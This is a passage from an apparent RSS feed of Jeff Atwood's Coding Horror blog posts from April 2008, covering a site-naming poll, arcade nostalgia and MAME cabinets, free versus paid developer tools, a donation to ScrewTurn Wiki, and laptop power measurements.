<div style=" width: 10px; height: 15px; background-color: rgb(204, 204, 204);"><img alt="image placeholder" >
</td>
</tr>
<tr bgcolor="lightyellow">
<td style="width: 260px;" title="stackoverflow.com - 25%"><strong>stackoverflow.com</strong></td>
<td align="right"><strong>1,721</strong></td>
<td align="right"><strong>25%</strong></td>
<td width="90">
<div style=" width: 50px; height: 15px; background-color: rgb(204, 204, 204);"><img alt="image placeholder" >
</td>
</tr>
<tr>
<td style="width: 260px;" title="understandrecursion.com - 1%">understandrecursion.com</td>
<td align="right">35</td>
<td align="right">1%</td>
<td width="90">
<div style=" width: 2px; height: 15px; background-color: rgb(204, 204, 204);"><img alt="image placeholder" >
</td>
</tr>
<tr>
<td style="width: 260px;" title="shiftleft1.com - 1%">shiftleft1.com</td>
<td align="right">102</td>
<td align="right">1%</td>
<td width="90">
<div style=" width: 2px; height: 15px; background-color: rgb(204, 204, 204);"><img alt="image placeholder" >
</td>
</tr>
<tr>
<td style="width: 260px;" title="(other) - 6%">(other)</td>
<td align="right">442</td>
<td align="right">6%</td>
<td width="90">
<div style=" width: 12px; height: 15px; background-color: rgb(204, 204, 204);"><img alt="image placeholder" >
</td>
</tr>
<tr>
<td style="width: 260px;"></td>
<td align="right">6,895</td>
<td align="right"></td>
<td width="90"></td>
</tr>
</table>
<p>
I can't quite talk about what this developer community website will do yet, but we think it's going to be somewhat unique. It sure helps to <b>put a name on it first</b>.
</p>
<p>
We appreciate all feedback, even if it's of the "they all suck" variety. In that case, vote for the (other) option and leave your ideas in the comments or email me directly. You can use the clever as-you-type search at <a href="http://instantdomainsearch.com/">Instant Domain Search</a> to figure out what's available. I'm warning you: it's a wasteland out there. You'll have to be pretty clever indeed to come up with an interesting, simple name that isn't taken -- or, worse, domain-squatted.
</p>
<p>
<font color="red">Update:</font> If you're curious what the website will do, in broad terms, this <a href="http://thirstydeveloper.com/2008/04/07/ThirstyDeveloper18JeffAtwood.aspx">recent audio interview I did with Thirsty Developer</a> explains.
</p>
<p>
Commenters also pointed out some excellent articles on naming:
</p>
<p>
</p>
<ul>
<li>
<a href="http://sethgodin.typepad.com/seths_blog/2005/10/the_new_rules_o.html">The New Rules of Naming</a>
</li>
<li>
<a href="http://www.thinkvitamin.com/features/biz/how-to-name-your-company">How to Name Your Company</a>
</li>
<li>
<a href="http://gettingreal.37signals.com/ch13_Name_Hook.php">Name Hook</a>
</li>
<li>
<a href="http://www.mikepope.com/blog/DisplayBlog.aspx?permalink=1931">Naming Success</a>
</li>
<li>
<a href="http://www.igorinternational.com/process/naming-guide-product-company-names.php">Igor Naming Guide</a>
</li>
</ul>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-04-06T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/help-name-our-website/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Rediscovering Arcade Nostalgia ]]></title>
<link>https://blog.codinghorror.com/rediscovering-arcade-nostalgia/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
I think I spent most of my childhood -- and a large part of my life as a young adult -- <b>desperately wishing I was in a video game arcade</b>. When I finally obtained my driver's license, my first thought wasn't about the girls I would take on dates, or the road trips I'd take with my friends. Sadly, no. I was thrilled that I could <i>drive myself to the arcade any time I wanted</i>. I distinctly remember my first encounter with each watershed game of the arcade era: my first Space Invaders, my first Pac-Man, my first Donkey Kong, my first Galaga, and so on. I kept a running mental inventory of where each unique arcade machine I discovered was in order to feed my burning arcade urges. I was always strangely eager to visit the unimaginably tacky tourist trap <a href="http://en.wikipedia.org/wiki/South_of_the_Border_(attraction)">South of the Border</a> because that was the only place I had <i>ever</i> found that had my beloved <a href="http://www.klov.com/C/Crazy_Climber.html">Crazy Climber</a>. I can't say I know every single game on the <a href="http://www.klov.com/">KLOV</a>, but I'm no stranger to many of them.
</p>
<p>
I can also <b>attribute my career in software development to arcade games</b>. Like many software developers, my introduction to programming was my Dad telling me if <a href="http://www.codinghorror.com/blog/archives/000936.html">I wanted to play video games at home, I had to write them first</a>. Tough love hurts. Home game consoles were the gateway drug of choice for parents who imagined their children as young programmers, a sneaky way for parents to trick their lazy game-playing kids into learning BASIC. And who can forget the more obvious mutant crossovers, like the <a href="http://www.atariage.com/software_page.html?SoftwareLabelID=15">Atari 2600 BASIC Programming cartridge</a>?
</p>
<p>
<a href="http://www.atariage.com/software_page.html?SoftwareLabelID=15"><img alt="image placeholder" >
</p>
<p>
I'm trying to imagine what it would be like to key in a BASIC program on these hideous <a href="http://www.atariage.com/controller_page.html?SystemID=2600&amp;ControllerID=4">Atari Keypad controllers</a>.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Oh, and you can't <i>save</i> any of your brilliant up-to-63-character programs, either, which had to be a little disheartening. If you were unfortunate enough to receive the Atari Basic Programming cartridge as a gift intended to <a href="http://www.codinghorror.com/blog/archives/000669.html">launch you from gamer to programmer</a> -- instead of an actual computer -- my condolences.
</p>
<p>
It's probably not surprising, then, that <b>many adult geeks have a lifelong fascination with arcade nostalgia</b>. As with any other hobby, it can be taken to extremes. Like, say, for example, if you were to <a href="http://www.washingtonpost.com/wp-dyn/content/story/2008/02/02/ST2008020201061.html">add an arcade wing to your house</a> and dub it <a href="http://www.lunacityarcade.com">Luna City</a>. Could happen.
</p>
<p>
Unfortunately for you, I'm a classic enabler. If you have any interest in vintage arcade gaming at all, I'm warning you -- don't read any further. I've spent a solid decade pursuing my arcade obsession as an adult armed with full time jobs and disposable income, with varying degrees of commitment and success.
</p>
<p>
Let's start with the cheap and satisfying route. These <b>large format, high resolution color coffee table books on arcade history</b> are a wonderful trip through our shared geek heritage. I had tremendous fun bringing them in to work and paging through them with my coworkers. Writing about them now made me pull them down from my bookshelf and start flipping through again myself. They are, in short, why coffee tables were invented.
</p>
<p>
<a href="http://www.amazon.com/exec/obidos/ASIN/0262524201/codihorr-20">Supercade: A Visual History of the Videogame Age 1971-1984</a>
</p>
<p>
<a href="http://www.amazon.com/exec/obidos/ASIN/0262524201/codihorr-20"><img alt="image placeholder" >
</p>
<p>
<a href="http://www.amazon.com/exec/obidos/ASIN/0072231726/codihorr-20">High Score!: The Illustrated History of Electronic Games</a>
</p>
<p>
<a href="http://www.amazon.com/exec/obidos/ASIN/0072231726/codihorr-20"><img alt="image placeholder" >
</p>
<p>
They aren't technically about <i>arcade</i> games, but <a href="http://www.amazon.com/exec/obidos/ASIN/1574325736/codihorr-20">Classic 80s Home Video Games: Identification &amp; Value Guide</a> and <a href="http://www.amazon.com/exec/obidos/ASIN/3000153594/codihorr-20">The Encyclopedia of Game Machines</a> are in the same vein, also outstanding, and worth a look.
</p>
<p>
But these games beg to be <i>played</i>, not merely read about. The next inevitable step on the journey is to discover <a href="http://en.wikipedia.org/wiki/MAME">MAME</a>, the venerable multiple arcade machine emulator. It's nothing less than a geek rite of passage. It is the acid test for any new hardware platform, whether it's a phone, a PDA, or <a href="http://digita.mame.net/">even a digital camera</a>: <b>can we make it run MAME?</b>
</p>
<p>
<a href="http://digita.mame.net/"><img alt="image placeholder" >
</p>
<p>
Soon after discovering MAME, any true geek develops <b>the irresistible urge to build real arcade hardware</b> so they can fully enjoy these classic arcade titles the way they were meant to be played. Now that I'm thinking about it, I actually question the credentials of any geek who <i>hasn't</i> felt compelled to build hardware for MAME at some point. I've done it myself many times. My first true arcade build was my home <a href="https://web.archive.org/web/20060217065654/http://www.codinghorror.com/mamecocktail/">MAME cocktail kit</a>.
</p>
<p>
<a href="https://web.archive.org/web/20060217065654/http://www.codinghorror.com/mamecocktail/"><img alt="image placeholder" >
</p>
<p>
But the biggest and best build I've done to date is the <a href="https://web.archive.org/web/20070302174546/http://blogs.vertigosoftware.com/jatwood/archive/2005/11/18/1654.aspx">SlikStik standup cabinet and authentic arcade monitor</a>, through the generous patronage of my previous employer, <a href="http://www.vertigo.com/">Vertigo</a>.
</p>
<p>
<a href="https://web.archive.org/web/20070302174546/http://blogs.vertigosoftware.com/jatwood/archive/2005/11/18/1654.aspx"><img alt="image placeholder" >
</p>
<p>
SlikStik is sadly defunct, but the cabinet lives on.
</p>
<p>
These are only two of <a href="http://www.google.com/url?sa=t&amp;ct=res&amp;cd=1&amp;url=http%3A%2F%2Fwww.mameroom.com%2F&amp;ei=Edj7R6S8DIHUpgSzleGSAQ&amp;usg=AFQjCNEZ9a8EwcMMPx8uaEsY29vsTZiNPw&amp;sig2=QrkKdAgR6cPZiOIu1BYmHQ">several possible arcade cabinet form factors</a>. It's not as complicated as it looks. The <a href="http://arcadecontrols.com/">BYOAC site</a> is an excellent resource, as is the outstanding <a href="http://www.amazon.com/exec/obidos/ASIN/0764556169/codihorr-20">Project Arcade: Build Your Own Arcade Machine</a> book. Arcade control hardware is actually fairly simple, for the most part; it tends to be of the simple binary push button type. I've also taken a cheap USB gamepad and soldered a salvaged arcade controller together myself, <a href="http://www.friday.com/bbum/2007/11/09/make-your-own-arcade-controls/">as Bill Bumgarner describes</a>. It's just downright fun to browse through the <a href="http://www.happcontrols.com/">Happ Controls</a> website and play with all the cool arcade hardware they offer.
</p>
<p>
If you don't want to invest the time and effort into building your own arcade controls,  <b>the best, least expensive off-the-shelf arcade controls right now are the <a href="http://www.xgaming.com">X-Arcade series</a></b>. They've <i>finally</i> gone fully USB, which means they're compatible with pretty much everything, Mac or otherwise. It drove me absolutely bonkers that for years, <b>the accepted standard arcade control interface was a lousy PS/2 keyboard connector</b>. The controller itself still shows up as a USB keyboard, which I find quite silly in this day and age, but at least it's progress.
</p>
<p>
There are a few different flavors, depending on how much you want to spend, and what kind of games you're into. The flagship model is the <a href="http://www.amazon.com/exec/obidos/ASIN/B000ST0184/codihorr-20">X-Arcade Tankstick</a>, which bundles two sets of player controls and a trackball for $200.
</p>
<p>
<a href="http://www.amazon.com/exec/obidos/ASIN/B000ST0184/codihorr-20"><img alt="image placeholder" >
</p>
<p>
They also offer a <a href="http://www.amazon.com/exec/obidos/ASIN/B00006I5ZX/codihorr-20">two-player controller sans trackball</a> for $130, and a <a href="http://www.amazon.com/exec/obidos/ASIN/B00008ELB0/codihorr-20">single-player joystick</a> or <a href="http://www.amazon.com/exec/obidos/ASIN/B000CD53RA/codihorr-20">standalone trackball</a> for $100. I own several of these, and the build quality and feel is arcade to the bone. The included pinball flipper buttons on each side are a nice touch for a <a href="http://www.codinghorror.com/blog/archives/000614.html">pinball simulator enthusiast</a> like me.
</p>
<p>
If you're looking for something radically simpler, the <a href="http://www.zombienexus.com/forums/cms_view_article.php?aid=28&amp;page=1&amp;sid=7cdc4f2d5810c1007af224da06f0ee7d">Competition Pro USB joystick</a> is a good choice. I've been happy with mine, but you do have to give up on the idea of playing any game with more than 2 buttons. It has to be imported from Europe, but it's not expensive.
</p>
<p>
<a href="http://www.zombienexus.com/forums/cms_view_article.php?aid=28&amp;page=1&amp;sid=7cdc4f2d5810c1007af224da06f0ee7d"><img alt="image placeholder" >
</p>
<p>
Or at least it <i>wasn't</i> expensive. After browsing around for a bit, I'm not even sure the Competition Pro USB is available for sale at any price, anywhere. Options for inexpensive USB arcade controllers are pretty limited and often sketchy; I encourage you to look at <b>the known quality of the X-Arcade controllers</b> if you're at all interested.
</p>
<p>
I warned you. It's an addiction. Now where did I put my Pac-Man Operator's License? Oh yes, there it is.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
See you on <a href="http://en.wikipedia.org/wiki/Kill_screen">level 256</a>. Who knows, <a href="http://www.gamedev.net/reference/design/features/mame/default.asp">you might even learn something</a> along the way.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-04-07T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/rediscovering-arcade-nostalgia/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ We Don't Use Software That Costs Money Here ]]></title>
<link>https://blog.codinghorror.com/we-dont-use-software-that-costs-money-here/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Whenever the regular expression topic comes up, I unashamedly recommend the best tool on the market for parsing and building regular expressions -- <a href="http://www.regexbuddy.com/cgi-bin/affref.pl?aff=jatwood">RegexBuddy</a>. But there's one tiny problem.
</p>
<p>
RegexBuddy costs money.
</p>
<p>
I've always encountered vague resistance when recommending commercial tools that I considered best of breed. The source of that resistance was spelled out for me by Henrik Sarvell in this comment he left on <a href="http://blog.wekeroad.com/2007/10/30/in-which-we-discuss-proprietary-object-noise/">Rob Conery's blog:</a>
</p>
<p>
</p>
<blockquote>
Yes, I also have to brush up on the regex from time to time. <b>We don't use software that costs money here</b>, and last time I checked regexbuddy wasn't free.
</blockquote>
<p>
People usually don't state their preferences this boldly. I, for one, applaud the honesty.
</p>
<p>
I've <a href="http://www.codinghorror.com/blog/archives/000454.html">recommend Beyond Compare</a> before; it's a fantastic file and directory comparison tool. It's not expensive, but it's not free, either. Which means many programmers I recommend it to will beg off and go install the free <a href="http://winmerge.org/">WinMerge</a> comparison tool instead.
</p>
<p>
It's tempting to ascribe this to the "cult of no-pay", programmers and users who simply <b>won't pay for software</b> no matter how good it is, or how inexpensive it may be. These people used to be called <i>pirates</i>. Now they're <i>open source enthusiasts</i>.
</p>
<p>
(<font color="red">Update:</font> This paragraph was intended to be tongue in cheek, but has been <a href="http://perlbuzz.com/2008/04/open-source-is-not-piracy.html">widely misinterpreted</a>. Dan summarized my opinion in the comments: "in the past, if someone told you they used software and didn't pay for it, the only plausible interpretation was that they were a pirate, because all good PC software cost money. Now there's also <b>good software available for free</b>, so that assumption is no longer correct.")
</p>
<p>
But there's something else going on here, too: <b>the free software alternatives keep getting better every year</b>. Consider how immature Linux development tools were in 2000 compared to what's available today: <a href="http://www.eclipse.org/">Eclipse</a>, <a href="http://subversion.tigris.org/">Subversion</a>, <a href="http://www.mysql.com/">MySQL</a>, <a href="http://www.mozilla.com/en-US/">Firefox</a>. These tools either didn't exist, or have come astounding distances in closing the gap between their commercial counterparts in eight years.
</p>
<p>
<a href="http://www.php.net/usage.php"><img alt="image placeholder" >
</p>
<p>
PHP was dangerously close to a joke language in 2000, but you can barely go anywhere on the web today without running into something huge built on PHP. I could say the same thing about MySQL -- a toy database in 2000, but a totally credible free alternative to Oracle and SQL Server today for most uses. <b>The competitive pressure of free products on commercial tools intensifies every year</b>. It's relentless. And to be honest, I feel many of the commercial alternatives aren't evolving fast enough to stay ahead of their free competition.
</p>
<p>
The onus is on the commercial tool vendors to prove that they provide enough value to warrant spending money. In the case of Beyond Compare, the vendor has taken so long to ship version 3.x of their software that some of the free comparison tools have matched and even exceeded its feature set in the meantime -- as you can see in this amusingly titled <a href="http://en.wikipedia.org/wiki/Comparison_of_file_comparison_tools">comparison of file comparison tools</a>. Resting on their laurels is a luxury they no longer have.
</p>
<p>
It's entirely possible for commercial development tools to survive alongside the strong, vibrant -- and now firmly established -- ecosystem of free tools. But it won't be easy, as Steven Frank points out in <a href="http://stevenf.com/archive/the-first--the-free--and-the-good.php">The First, The Free, and The Best</a>:
</p>
<p>
</p>
<blockquote>
A free program need not be glamorous or even completely bug-free. It can garner a respectable following simply by not costing anything.
<p>
I've seen many times people struggle and struggle on with a clunky freeware app just because they're not willing to pay $20 for a significantly better alternative. There's nothing wrong with that particular brand of masochism. People prioritize differently, and money is more valuable than time to a whole lot of people. It's Capitalism in action.
</p>
<p>
The people who are most tenacious about exclusively using freeware whenever possible are usually incredulous that anyone would buy a commercial product when a free alternative is available. I've heard many times, "how can you guys make a living when <i>free</i> command line file transfer clients are <i>included</i> with the OS?"
</p>
</blockquote>
<p>
Beyond Compare was the best compare tool by far in 2005 -- an easy justification for spending thirty bucks on a compare tool. But no longer. They have to claw their way back to the top and become the best again in the face of endless free competition.
</p>
<p>
</p>
<blockquote>
If you're neither first nor free, there is still a way to carve out a niche for yourself: <b>have a better application than everyone else</b>.
<p>
Quality is the third leg of the axis. A free app may not be worth what you paid if it doesn't work right, or works so clumsily that you have to re-read the help file every time you use it. The first app may be OK, but resting on its laurels of first-ness and not moving forward.
</p>
</blockquote>
<p>
This phenomenon isn't limited to development software, although I think it's particularly vicious there due to the peculiarities of the audience: the type of people who would buy development tools are also exactly the same people who could potentially <i>build</i> them.
</p>
<p>
You may wonder how anything survives online in the face of free competition. Don MacAskill of <a href="http://smugmug.com/">SmugMug</a> -- a pay photo sharing website -- <a href="http://www.npost.com/interview.jsp?intID=INT00183">offers this advice</a>:
</p>
<p>
</p>
<blockquote>
It turns out that people are happy to pay [for web photo sharing], and have been happy to pay for the last four years. The reason is that our pay service eliminates a lot of the baggage and a lot of headaches that at least some percentage of the population doesn't want. Quite of a few of the big brands have shut their free sites down. They shut them down without notice. It turns out that it's sort of like a death spiral. When you offer accounts for free, some garbage comes in with the good stuff. People will upload porn or whatever. So you end up hiring people to work at your company to filter out the bad stuff. I know Photobucket and Webshots and some of the other guys have an entire room full of people who, all they do all day is watch the photos that are coming in and say yes or no, this photo is OK or not.
<p>
But inevitably, some of the junk slips through, and then the people who are using your service who don't have any junk see their photos side by side with the junk, and get up set and leave. Or even worse yet, some of your advertisers (because if you're free you're likely ad supported) see their ad right next to something disgusting or that damages their brand or something like that. So they bail. So eventually, your customers and your advertisers tend to run away screaming. Or you're left with a demographic which isn't a very important demographic for advertisers, or who wouldn't be likely to upgrade. So it gets kind of nasty.</p>
</blockquote>
<p>
I knew Don from <a href="http://don.smugmug.com/gallery/127686_dJQBJ#4611586">his days in the gaming industry</a> at Ritual Entertainment. I finally got to meet him at last year's MIX conference, and I thoroughly enjoy reading <a href="http://blogs.smugmug.com/don/">his blog</a>. It's a case study in how you can beat 'free' by understanding the weaknesses of your free competition.
</p>
<p>
It won't be easy for commercial software or subscription websites. If past history is any indication, <b>beating the free alternatives is going to get progressively more difficult every year</b>. Kevin Kelly offers <a href="http://www.kk.org/thetechnium/archives/2008/01/better_than_fre.php">eight generative qualities that are better than free</a>. I'm not sure it has to be that complicated. Free is indeed a competitive advantage. But free is also a weakness: it is cheap, mass-produced, and the same for everyone. Don and Steven make a compelling argument that some people are willing to pay for a premium experience.
</p>
<p>
So the salient question, then, is this: <b>do you understand what it takes to build the premium experience that trumps your free competition?</b> And can you <i>deliver</i> it?
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-04-09T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/we-dont-use-software-that-costs-money-here/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Donating $5,000 to .NET Open Source ]]></title>
<link>https://blog.codinghorror.com/donating-5000-to-net-open-source/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Way back in June of last year, I promised to <a href="http://www.codinghorror.com/blog/archives/000893.html">donate a portion of my advertising revenue</a> back to the community:
</p>
<p>
</p>
<blockquote>
I will be donating a significant percentage of my ad revenue back to the programming community. The programming community is the reason I started this blog in the first place. The programming community is what makes this blog possible. It's an open secret amongst bloggers that the blog comments are often better than the original blog post, and it's because the community collectively knows far more than you or I will ever know.
<p>
So, what's <i>significant</i>? Let's start with $5,000.
</p>
<p>
I've personally benefited most from the .NET open source community, which I feel is radically under-served by Microsoft, so I'll be contributing this money to one or more .NET open source projects to maximize its impact. And what's even more exciting is that I have a verbal commitment from <a href="http://blogs.msdn.com/aniyer/">Anand Iyer</a>, a MS Developer Evangelist, for Microsoft to match my contribution. That makes a cool $10,000 we will be contributing to support open-source .NET projects!
</p>
<p>
As much as I abhor advertising, I'm tremendously excited to have the opportunity to share my advertising revenue with the larger .NET programming community. For me, that's the tipping point. Giving back to the community is what makes the pain of advertising worthwhile.
</p>
</blockquote>
<p>
You may be wondering <a href="http://www.codinghorror.com/blog/archives/000894.html">why I'm singling out .NET here</a>:
</p>
<p>
</p>
<blockquote>
Why am I focusing on .NET open source projects? In short, because <b>open source projects are treated as second-class citizens in the Microsoft ecosystem</b>. Many highly popular open source projects have contributed so much to the .NET community, and they've gotten virtually no support at all from Microsoft in return. I'd like to see that change. In fact, I'll go even further-- I think it <i>must</i> change if Microsoft wants to survive as a vendor of development tools.
</blockquote>
<p>
I originally had grand plans of dividing the money up a few different ways, and setting up a voting system to determine which projects were awarded the various grants. I even considered a March Madness college basketball themed set of brackets and finals and everything. After agonizing over this process for <i>months</i>, I've decided that's too complicated. There are almost <a href="http://spreadsheets.google.com/pub?key=pKxDW35algYebfs8nssTjIQ">a hundred contenders</a>, all of which have to be mapped to <a href="http://www.codinghorror.com/blog/archives/000904.html">the criteria I defined for the grant</a>:
</p>
<p>
</p>
<ol>
<li>The project must use an <b>open source license</b>.
</li>
<li>The project must use a commonly available method of <b>public source control</b>.
</li>
<li>The project must provide public evidence that it <b>accepts and encourages code contributions</b> from the outside world.
</li>
</ol>
<p>
I'm exercising my executive privilege and keeping it simple. I'm picking a winner and <b>they get the whole $5,000</b>.
</p>
<p>
The winner is still based on voting, of a sort; I did a word count on <a href="http://www.codinghorror.com/blog/archives/000894.html#comments">the comments to my original post</a>. One project was mentioned over and over again in the comments, and it met all three criteria.
</p>
<p>
I'm proud to announce that this year's $5,000 .NET open source grant goes to <a href="http://www.screwturn.eu/">ScrewTurn Wiki</a>.
</p>
<p>
<a href="http://www.screwturn.eu/"><img alt="image placeholder" >
</p>
<p>
This is like one of those exaggeratedly giant checks you see people winning on TV; it's for promotional purposes only. There's no actual check. The real money is being sent via wire transfer to Dario Solera, the ScrewTurn Wiki project coordinator. What's Dario going to do with this money? You'll have to ask him. That's not for me to decide. There are <b>no strings attached</b> to this money of any kind. I trust the judgment of a fellow programmer to run their project as they see fit.
</p>
<p>
(Microsoft's $5,000 grant will be handled independently; details will be forthcoming soon on that.)
</p>
<p>
I won't lie to you. It was easy to promise this grant money when I was essentially getting paid twice -- once by my previous employer Vertigo Software, and again by my blog via advertising revenue. That increasing sense of guilt over "double dipping" was one of the reasons <a href="http://www.codinghorror.com/blog/archives/001074.html">I felt compelled to quit</a>. But now that I have to cover the mortgage -- a crazy California mortgage no less --  with revenue from my blog, and the unknown future revenue from our upcoming stackoverflow.com, it's a bit scarier.
</p>
<p>
But I figure if it isn't a <i>little</i> scary, it's not worth doing.
</p>
<p>
And I have found that you get back what you give, many times over.
</p>
<p>
It's a small gesture, I know. But I believe in this stuff. I wouldn't have kept banging out entries on this blog for the last four years if I didn't <i>truly believe</i> in the power of programmers collectively building useful stuff together. Here's to Dario Solera, and all the ScrewTurn Wiki programmers -- and to the spirit of every programmer who has ever helped build something for the programming community.
</p>
<p>
And who knows -- maybe next year we'll even do this thing again.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-04-10T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/donating-5000-to-net-open-source/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Revisiting &quot;How Much Power Does My Laptop Really Use&quot;? ]]></title>
<link>https://blog.codinghorror.com/revisiting-how-much-power-does-my-laptop-really-use/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Back in 2006, I <a href="http://www.codinghorror.com/blog/archives/000562.html">examined the power usage of my Dell Inspiron 300M laptop</a>. It was the first ultraportable I ever owned, and I fell in love with it. I stuck it out as long as possible on that wonderful little laptop until the true heir to the ultraportable throne was unveiled: the <a href="http://www.codinghorror.com/blog/archives/000927.html">Dell XPS M1330</a>. The specs are much better, as you'd expect after almost five years. But what about power consumption? How much has that changed? Let's find out.
</p>
<p>
One of the key weapons in my geek arsenal is the <a href="http://www.amazon.com/exec/obidos/ASIN/B00009MDBU/codihorr-20">Kill-a-Watt electricity usage monitor</a>. Here's an action shot of me using it while <a href="http://www.codinghorror.com/blog/archives/000907.html">building a PC</a>:
</p>
<p>
<a href="http://www.amazon.com/exec/obidos/ASIN/B00009MDBU/codihorr-20"><img alt="image placeholder" >
</p>
<p>
I see that there's a newer, more advanced <a href="http://www.amazon.com/exec/obidos/ASIN/B000RGF29Q/codihorr-20">Kill-a-Watt model P4600</a> on the market now, but the modest <a href="http://www.amazon.com/exec/obidos/ASIN/B00009MDBU/codihorr-20">P4400</a> I own is only 24 bucks and works plenty well enough for me. I know, I know, I'm always encouraging you to buy more crap. But this is something I really do <i>use</i> quite regularly. Here, I'll prove it:
</p>
<p>
</p>
<ul>
<li>
<a href="http://www.codinghorror.com/blog/archives/000353.html">Why Estimate When You Can Measure?</a>
</li>
<li>
<a href="http://www.codinghorror.com/blog/archives/000426.html">The Cost of Leaving Your PC On</a>
</li>
<li>
<a href="http://www.codinghorror.com/blog/archives/000868.html">When Hardware is Free, Power is Expensive</a>
</li>
<li>
<a href="http://www.codinghorror.com/blog/archives/000871.html">Upgrading to a High Efficiency Power Supply</a>
</li>
</ul>
<p>
And here I am today using it again. It's awfully handy to know how much power the stuff around your house is using. So let's get down to brass tacks on this laptop. Here are the specifications of my Dell XPS M1330:
</p>
<p>
</p>
<ul>
<li>Intel Core 2 Duo 2.0 GHz processor
</li>
<li>2 GB RAM
</li>
<li>32 GB solid state hard drive
</li>
<li>13.3" 1280x800 LED backlit display
</li>
<li>NVIDIA GeForce Go 8400M GS video
</li>
<li>Windows Vista Ultimate
</li>
</ul>
<p>
It's not the world's fastest laptop, to be sure, but totally respectable for an under 4 pound ultraportable. Here are some baseline power usage measurements:
</p>
<p>
</p>
<blockquote><table width="450">
<tr>
<td>Laptop off, battery charging
</td>
<td width="50">54w
</td>
</tr>
<tr>
<td>Laptop off, battery disconnected
</td>
<td>0w
</td>
</tr>
<tr>
<td>Laptop off, sleeping
</td>
<td>0w
</td>
</tr>
<tr>
<td>Laptop on, idle at Windows desktop
</td>
<td>20w
</td>
</tr>
</table></blockquote>
<p>
I should point out that I'm using a very clean install of Vista, with <a href="http://www.codinghorror.com/blog/archives/000803.html">most of the unnecessary background stuff</a> disabled. I left the laptop in a typical real world configuration; screen brightness is at maximum, WiFi is enabled and connected to an access point, power management is set to the default of "Balanced". I let the machine quiesce for an hour at the desktop so all those background processes Vista loves to run were idle.
</p>
<p>
All the below tests were run with the laptop connected to AC power and the battery physically removed from the machine.
</p>
<p>
<b>How much power does the LCD display use?</b>
</p>
<p>
</p>
<blockquote>
<table width="450">
<tr>
<td>LCD brightness 7 (max)</td>
<td width="50">20w
</td>
</tr>
<tr>
<td>LCD brightness 6</td>
<td>19w
</td>
</tr>
<tr>
<td>LCD brightness 5</td>
<td>18w
</td>
</tr>
<tr>
<td>LCD brightness 0-4</td>
<td>17w
</td>
</tr>
</table>
</blockquote>
<p>
<b>How much power does the hard drive use?</b>
</p>
<p>
</p>
<blockquote><table width="450">
<tr>
<td>HDD idle</td>
<td width="50">20w
</td>
</tr>
<tr>
<td>HDD defragmenting</td>
<td>23w
</td>
</tr>
</table></blockquote>
<p>
<b>How much power does the onboard WiFi use?</b>
</p>
<p>
</p>
<blockquote><table width="450">
<tr>
<td>WiFi disabled</td>
<td width="50">17.5w
</td>
</tr>
<tr>
<td>WiFi enabled</td>
<td>20w
</td>
</tr>
<tr>
<td>WiFi <a href="http://www.codinghorror.com/blog/archives/000339.html">bandwidth test</a>
</td>
<td>24w
</td>
</tr>
</table></blockquote>
<p>
<b>How much power does the CPU use?</b>
</p>
<p>
</p>
<blockquote>
<table width="450">
<tr>
<td>CPU idle</td>
<td width="50">20w
</td>
</tr>
<tr>
<td>CPU running one <a href="http://www.mersenne.org/">prime95</a> torture test</td>
<td>50w
</td>
</tr>
<tr>
<td>CPU running two <a href="http://www.mersenne.org/">prime95</a> torture tests</td>
<td>63w
</td>
</tr>
</table>
</blockquote>
<p>
<b>How much power does the video card (GPU) use?</b>
</p>
<p>
</p>
<blockquote>
<table width="450">
<tr>
<td>GPU idle</td>
<td width="50">20w
</td>
</tr>
<tr>
<td>GPU running <a href="http://www.daionet.gr.jp/~masa/rthdribl/">rthdribl</a>
</td>
<td>55w
</td>
</tr>
<tr>
<td>GPU running <a href="http://www.softpedia.com/get/Tweak/Video-Tweak/ATITool.shtml">ATITool</a> 3D warmup</td>
<td>40w
</td>
</tr>
</table>
</blockquote>
<p>
(The ATITool number is the more accurate one, as this particular 3D warmup "fuzzy cube" test exercises the GPU while only loading the CPU to about 14%, whereas the rthdribl test loads the CPU to around 50%.)
</p>
<p>
<b>How much power does the integrated DVD drive use?</b>
</p>
<p>
</p>
<blockquote>
<table width="450">
<tr>
<td>DVD idle</td>
<td width="50">20w
</td>
</tr>
<tr>
<td>DVD spinning with disc inserted</td>
<td>25w
</td>
</tr>
<tr>
<td>DVD copying</td>
<td>33w
</td>
</tr>
</table>
</blockquote>
<p>
<b>How much power does the integrated CPU fan use?</b>
</p>
<p>
</p>
<blockquote>
<table width="450">
<tr>
<td>CPU fan off</td>
<td width="50">20w
</td>
</tr>
<tr>
<td>CPU fan low</td>
<td>21w
</td>
</tr>
<tr>
<td>CPU fan med/high</td>
<td>22w
</td>
</tr>
</table>
</blockquote>
<p>
Realize that the Kill-o-watt is a fine instrument, but it's not scientifically precise. It's the overall percentages and patterns we're interested in more than the absolute numbers. The results are different than last time, yet <b>the rules of laptop power consumption haven't fundamentally changed</b>. Here's the data in chart form, with minimum and maximum power draw I measured for each component. The number in red is the difference between the two.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
The top consumers of your laptop's power are the CPU, the GPU, the DVD, and WiFi -- in that order. So, armed with this data, <b>how do we maximize our laptop battery life?</b>
</p>
<p>
Some of this is fairly obvious. When you're on battery:
</p>
<p>
</p>
<ol>
<li>Don't do anything with 3D graphics (gaming, etc)
</li>
<li>Avoid using DVDs
</li>
<li>Turn down the screen brightness 1 or 2 notches
</li>
